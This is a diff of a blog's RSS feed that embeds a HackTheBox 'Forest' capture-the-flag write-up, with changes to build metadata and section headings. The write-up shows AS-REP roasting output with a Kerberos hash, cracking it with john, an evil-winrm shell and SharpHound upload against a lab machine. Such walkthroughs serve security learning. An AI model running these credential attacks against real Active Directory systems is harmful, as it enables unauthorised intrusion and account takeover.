@@ -10,9 +10,9 @@
       <url>https://images.alphacoders.com/712/thumb-1920-712781.jpg</url>
     </image>
     <ttl>1440</ttl>
-    <generator>After Dark 9.1.0 (Hugo 0.59.1)</generator>
+    <generator>After Dark 9.1.0 (Hugo 0.74.2)</generator>
     <language>en-US</language>
-    <lastBuildDate>Wed, 25 Mar 2020 14:15:08 UT</lastBuildDate>
+    <lastBuildDate>Wed, 05 Aug 2020 08:17:19 UT</lastBuildDate>
     <atom:link href="https://domain.example/tags/bloodhound/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HTB Write-up: Forest</title>
@@ -23,7 +23,7 @@
       <description>The Forest Windows box retired this weekend on HackTheBox. Getting user was quite straight forward but escalating privileges was a little more compricated. We&amp;rsquo;ll have a look at BloodHound for that last step, it&amp;rsquo;s an open source tool that I use a lot for work now and that I can&amp;rsquo;t recommend enough.
 1: Recon First, I do the usual nmap scan I start with on all boxes: nmap -A -T5 10.</description>
       <category domain="https://domain.example/categories/post">Post</category>
-      <content:encoded><![CDATA[ The Forest Windows box retired this weekend on HackTheBox. Getting user was quite straight forward but escalating privileges was a little more compricated. We&amp;rsquo;ll have a look at BloodHound for that last step, it&amp;rsquo;s an open source tool that I use a lot for work now and that I can&amp;rsquo;t recommend enough.
+      <content:encoded><![CDATA[The Forest Windows box retired this weekend on HackTheBox. Getting user was quite straight forward but escalating privileges was a little more compricated. We&amp;rsquo;ll have a look at BloodHound for that last step, it&amp;rsquo;s an open source tool that I use a lot for work now and that I can&amp;rsquo;t recommend enough.
 1: Recon First, I do the usual nmap scan I start with on all boxes: nmap -A -T5 10.10.10.161 -oN nmap.txt
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 10:08 EDT
 Nmap scan report for 10.10.10.161
@@ -75,8 +75,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:8fc61bd2945c40654201cce35f6702c7$cc2d0b8f0d
 [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
 [-] User qwe doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
 [-] User forest doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set  As we expected, src-alfresco was misconfigured and did not require pre-authentication and we got the account&amp;rsquo;s hash! Time to crack it!
-
-2: Getting a shell Copy the hash to a text file called hash.txt, and run the following with john: root@kali:~/# john --wordlist=/root/rockyou.txt hash.txt
+Copy the hash to a text file called hash.txt, and run the following with john: root@kali:~/# john --wordlist=/root/rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
 Will run 4 OpenMP threads
@@ -85,8 +84,7 @@ s3rvice (?)
 1g 0:00:00:03 DONE (2019-10-13 12:36) 0.2557g/s 1044Kp/s 1044Kc/s 1044KC/s s4553592..s3r2s1
 Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed  Great! It took only 3 seconds, but not surprising with how bad the password was: s3rvice. Now we can get our shell with my favourite evil-winrm and get the user flag:
-
-3: Priviledge Escalation In Active Directory, you can use BloodHound to find relationships (between users, groups and computers) which can be used to escalate your privileges. It is very useful for the red team but also for the blue team in order to identify and mitigate the vulnerabilities and limit the paths to high value targets within your AD architecture.
+In Active Directory, you can use BloodHound to find relationships (between users, groups and computers) which can be used to escalate your privileges. It is very useful for the red team but also for the blue team in order to identify and mitigate the vulnerabilities and limit the paths to high value targets within your AD architecture.
 After downloading the lastest release of BloodHound, we can use our evil-winrm shell to upload it to the serve, run it there, and download back the results which will be in a zip format.
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents upload ~/Downloads/BloodHound/Ingestors/SharpHound.ps1 .\SharpHound.ps1
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents Import-Module .\SharpHound.ps1
